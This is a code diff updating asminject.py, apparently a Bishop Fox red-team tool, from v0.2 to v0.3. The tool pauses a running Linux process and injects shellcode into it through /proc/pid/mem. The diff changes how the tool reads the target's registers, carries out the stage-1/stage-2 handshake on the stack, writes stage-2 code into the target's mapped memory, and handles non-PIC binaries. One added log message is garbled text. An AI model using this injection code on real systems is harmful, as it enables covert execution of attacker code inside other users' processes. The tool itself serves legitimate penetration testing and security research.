@@ -12,7 +12,7 @@ BANNER = r"""
         \/                   \/\______|    \/     \/     \/|__|   \/
 
 asminject.py
-v0.2
+v0.3
 Ben Lincoln, Bishop Fox, 2021-08-30
 https://github.com/BishopFox/asminject
 based on dlinject, which is Copyright (c) 2019 David Buchanan
@@ -37,6 +37,8 @@ STAGE2_SIZE = 0x8000
 # For "slow" mode
 HIGH_PRIORITY_NICE = -20
 LOW_PRIORITY_NICE = 20
+
+MAX_ADDRESS_NPIC_SUGGESTION = 0x00400000
 
 def ansi_color(name):
     color_codes = {
@@ -137,31 +139,54 @@ def assemble(source, library_bases, relative_offsets, replacements = {}, ansi=Tr
         log_error(f"Couldn't delete termporary binary file '{out_path}': {e}")
     return result_code
 
-def get_library_base_addresses(pid, pic_binaries, ansi=True):
+def get_library_base_addresses(pid, non_pic_binaries, ansi=True):
     result = {}
     with open(f"/proc/{pid}/maps") as maps_file:
         for line in maps_file.readlines():
             ld_path = line.split()[-1]
             ld_base = int(line.split("-")[0], 16)
             if ld_path not in result.keys():
-                is_pic_binary = False
-                for pb_pattern in pic_binaries:
-                    if re.search(pb_pattern, ld_path):
-                        is_pic_binary = True
+                is_non_pic_binary = False
+                for npb_pattern in non_pic_binaries:
+                    if re.search(npb_pattern, ld_path):
+                        is_non_pic_binary = True
                         break
-                if is_pic_binary:
+                if is_non_pic_binary:
                     result[ld_path] = 0
-                    log(f"Handling '{ld_path}' as non-PIC binary", ansi=ansi)
+                    log_warning(f"Handling '{ld_path}' as non-PIC binary", ansi=ansi)
                 else:
                     result[ld_path] = ld_base
+                    if ld_base <= MAX_ADDRESS_NPIC_SUGGESTION:
+                        log_warning(f"'{ld_path}' has a base address of {ld_base}, which is very low for position-independent code. If the exploit attempt fails, try adding --non-pic-binary \"{ld_path}\" to your asminject.py options.", ansi=ansi)
     return result
 
 def get_temp_file_name():
     (tf, result) = tempfile.mkstemp(suffix=None, dir=None, text=False)
     os.close(tf)
     return result
+    
+def get_syscall_values(pid):
+    result = {}
+    syscall_data = ""
+    syscall_vals = []
+    result["rip"] = 0
+    result["rsp"] = 0
+    result["syscall_data"] = ""
+    try:
+        with open(f"/proc/{pid}/syscall") as syscall_file:
+            syscall_data = syscall_file.read()
+            result["syscall_data"] = syscall_data
+            syscall_vals = syscall_data.split(" ")
+        if " " in syscall_data:
+            result["rip"] = int(syscall_vals[-1][2:], 16)
+            result["rsp"] = int(syscall_vals[-2][2:], 16)
+        else:
+            log(f"Couldn't retrieve current syscall values")
+    except Exception as e:
+        log_error(f"Couldn't retrieve current syscall values: {e}")
+    return result
 
-def asminject(base_script_path, pid, asm_path, relative_offsets, pic_binaries, architecture, stage_mode, stopmethod="sigstop", stage_2_write_location="", stage_2_read_location="", ansi=True, pause=False, precompiled=False, custom_replacements = {}):
+def asminject(base_script_path, pid, asm_path, relative_offsets, non_pic_binaries, architecture, stage_mode, stopmethod="sigstop", stage_2_write_location="", stage_2_read_location="", ansi=True, pause=False, precompiled=False, custom_replacements = {}):
     asminject_pid = None
     asminject_priority = None
     target_priority = None
@@ -232,15 +257,18 @@ def asminject(base_script_path, pid, asm_path, relative_offsets, pic_binaries, a
     else:
         log.warn("We're not going to stop the process first!", ansi=ansi)
 
-    with open(f"/proc/{pid}/syscall") as syscall_file:
-        syscall_vals = syscall_file.read().split(" ")
-    rip = int(syscall_vals[-1][2:], 16)
-    rsp = int(syscall_vals[-2][2:], 16)
-
+    syscall_check_result = get_syscall_values(pid)
+    rip = syscall_check_result["rip"]
+    rsp = syscall_check_result["rsp"]
+    #original_rip = rip
+    #original_rsp = rsp
+    if rip == 0 or rsp == 0:
+        log_error("Couldn't get current syscall data")
+        sys.exit(1)
     log(f"RIP: {hex(rip)}", ansi=ansi)
     log(f"RSP: {hex(rsp)}", ansi=ansi)
 
-    library_bases = get_library_base_addresses(pid, pic_binaries, ansi=ansi)
+    library_bases = get_library_base_addresses(pid, non_pic_binaries, ansi=ansi)
     library_names = []
     for lname in library_bases.keys():
         library_names.append(lname)
@@ -276,6 +304,19 @@ def asminject(base_script_path, pid, asm_path, relative_offsets, pic_binaries, a
     with open(stage1_path, "r") as stage1_code:
         stage1 = assemble(stage1_code.read(), library_bases, relative_offsets, replacements=stage1_replacements, ansi=ansi)
 
+    if stage_mode == "mem":
+        with open(f"/proc/{pid}/mem", "rb") as mem:
+            # Get initial RSP value for comparison
+            log(f"RSP is 0x{rsp:016x}")
+            mem.seek(rsp)
+            #mem.seek(rsp + 16)
+            rsp_value = struct.unpack('Q', mem.read(8))[0]
+            mem.seek(rsp + 8)
+            #mem.seek(rsp + 24)
+            mmap_block = struct.unpack('Q', mem.read(8))[0]
+            log(f"Value at RSP is 0x{rsp_value:016x}")
+            log(f"MMAP'd block is 0x{mmap_block:016x}")
+
     with open(f"/proc/{pid}/mem", "wb+") as mem:
         # back up the code we're about to overwrite
         mem.seek(rip)
@@ -289,7 +330,7 @@ def asminject(base_script_path, pid, asm_path, relative_offsets, pic_binaries, a
         mem.seek(rip)
         mem.write(stage1)
 
-    log("Wrote first stage shellcode", ansi=ansi)
+    log(f"Wrote first stage shellcode at {rip:016x} in target  [rpcess ,e,pru", ansi=ansi)
 
     if not os.path.isfile(asm_path):
         log_error(f"Could not find the stage 2 file '{asm_path}'", ansi=ansi)
@@ -316,30 +357,60 @@ def asminject(base_script_path, pid, asm_path, relative_offsets, pic_binaries, a
         done_waiting = False
         with open(f"/proc/{pid}/mem", "wb+") as mem:
             while not done_waiting:
-                # check to see if stage 1 has given the OK to proceed
-                log(f"RIP is 0x{rip:016x}")
-                mem.seek(rip)
-                rip_value = struct.unpack('Q', mem.read(8))[0]
-                mem.seek(rip) + 8
-                mmap_block = struct.unpack('Q', mem.read(8))[0]
-                log(f"Value at RIP is 0x{rip_value:016x}")
-                log(f"MMAP'd block ([RIP + 8]) is is 0x{mmap_block:016x}")
-                
-                if rip_value == 0:
-                    # write stage 2
-                    mem.seek(mmap_block)
-                    mem.write(stage2)
-                    
-                    # Give stage 1 the OK to proceed
-                    mem.seek(rip)
-                    ok_val = struct.pack('I', 1)
-                    mem.write(ok_val)
-                    done_waiting = True
-                
-                else:
-                    log("Waiting for stage 1 to allocate memory")
-                    time.sleep(1.0)
-
+                syscall_data = ""
+                try:
+                    # check to see if stage 1 has given the OK to proceed
+                    syscall_check_result = get_syscall_values(pid)
+                    rip = syscall_check_result["rip"]
+                    rsp = syscall_check_result["rsp"]
+                    # with open(f"/proc/{pid}/syscall") as syscall_file:
+                        # syscall_data = syscall_file.read()
+                        # syscall_vals = syscall_data.split(" ")
+                    # if " " in syscall_data:
+                        # rip = int(syscall_vals[-1][2:], 16)
+                        # rsp = int(syscall_vals[-2][2:], 16)
+                    # else:
+                        # log(f"Couldn't retrieve current RIP/RSP values")
+                    #log(f"RIP is 0x{rip:016x}")
+                    #mem.seek(rip)
+                    #rip_value = struct.unpack('Q', mem.read(8))[0]
+                    #mem.seek(rip) + 8
+                    #mmap_block = struct.unpack('Q', mem.read(8))[0]
+                    #log(f"Value at RIP is 0x{rip_value:016x}")
+                    #log(f"MMAP'd block ([RIP + 8]) is 0x{mmap_block:016x}")
+                    sleep_this_iteration = True
+                    if rip != 0 and rsp != 0:
+                        log(f"RSP is 0x{rsp:016x}")
+                        mem.seek(rsp)
+                        #mem.seek(rsp + 16)
+                        rsp_value = struct.unpack('Q', mem.read(8))[0]
+                        mem.seek(rsp + 8)
+                        #mem.seek(rsp + 24)
+                        mmap_block = struct.unpack('Q', mem.read(8))[0]
+                        log(f"Value at RSP is 0x{rsp_value:016x}")
+                        log(f"MMAP'd block is 0x{mmap_block:016x}")
+                        
+                        if rsp_value == 0:
+                            sleep_this_iteration = False
+                            log(f"Writing stage 2 to 0x{mmap_block:016x} in target memory")
+                            # write stage 2
+                            mem.seek(mmap_block)
+                            mem.write(stage2)
+                            
+                            # Give stage 1 the OK to proceed
+                            log(f"Writing 0x01 to 0x{rsp:016x} in target memory to indicate OK")
+                            mem.seek(rsp)
+                            ok_val = struct.pack('I', 1)
+                            mem.write(ok_val)
+                            done_waiting = True
+                            log("Stage 2 proceeding")
+                        
+                    if sleep_this_iteration:
+                        log("Waiting for stage 1")
+                        time.sleep(1.0)
+                except Exception as e:
+                    log_error(f"Couldn't get target process information: {e}, {syscall_data}")
+                    sys.exit(1)
     else:
         with open(stage2_write_path, "wb") as stage2_file:
             os.chmod(stage2_write_path, 0o666)
@@ -408,7 +479,7 @@ if __name__ == "__main__":
     parser.add_argument("--relative-offsets", action='append', nargs='*', required=False,
         help="Path to the list of relative offsets referenced in the assembly code. May be specified multiple times to reference several files. Generate on a per-binary basis using the following command, e.g. for libc-2.31: # readelf -a --wide /usr/lib/x86_64-linux-gnu/libc-2.31.so | grep DEFAULT | grep FUNC | sed 's/  / /g' | sed 's/  / /g' | sed 's/  / /g' | sed 's/  / /g' | sed 's/  / /g' | cut -d\" \" -f3,9")
     
-    parser.add_argument("--pic-binary", action='append', nargs='*', required=False,
+    parser.add_argument("--non-pic-binary", action='append', nargs='*', required=False,
         help="Regular expression identifying one or more executables/libraries that do *not* use position-independent code, such as Python 3.x")
 
     parser.add_argument("--stop-method",
@@ -465,8 +536,6 @@ if __name__ == "__main__":
     asm_abs_path = os.path.abspath(args.asm_path)
     
     # readelf -a --wide /usr/lib/x86_64-linux-gnu/libc-2.31.so | grep DEFAULT | grep FUNC | sed 's/  / /g' | sed 's/  / /g' | sed 's/  / /g' | sed 's/  / /g' | sed 's/  / /g' | cut -d" " -f3,9 > offsets-libc-2.31.so.txt
-    # important:
-    # if you are writing code against an executable or library that is NOT position independent, those offsets need to be specified using the --absolute-offsets option instead
     relative_offsets = {}
     if args.relative_offsets:
         if len(args.relative_offsets) > 0:
@@ -490,15 +559,15 @@ if __name__ == "__main__":
         if not args.precompiled:
             log_error("A list of relative offsets was not specified. If the injection fails, check your payload to make sure you're including the offsets of any exported functions it calls.", ansi=args.plaintext)
     
-    pic_binaries = []
-    if args.pic_binary:
-        if len(args.pic_binary) > 0:
-            for elem in args.pic_binary:
+    non_pic_binaries = []
+    if args.non_pic_binary:
+        if len(args.non_pic_binary) > 0:
+            for elem in args.non_pic_binary:
                 for pb in elem:
                     if pb.strip() != "":
-                        if pb not in pic_binaries:
-                            pic_binaries.append(pb)
+                        if pb not in non_pic_binaries:
+                            non_pic_binaries.append(pb)
     
     base_script_path = os.path.dirname(os.path.abspath(inspect.getfile(inspect.currentframe())))
 
-    asminject(base_script_path, args.pid, asm_abs_path, relative_offsets, pic_binaries, args.arch, args.stage_mode, args.stop_method or "sigstop", stage_2_write_location=args.stage2_write_path, ansi=args.plaintext, pause=args.pause, precompiled=args.precompiled, custom_replacements=custom_replacements)
+    asminject(base_script_path, args.pid, asm_abs_path, relative_offsets, non_pic_binaries, args.arch, args.stage_mode, args.stop_method or "sigstop", stage_2_write_location=args.stage2_write_path, ansi=args.plaintext, pause=args.pause, precompiled=args.precompiled, custom_replacements=custom_replacements)
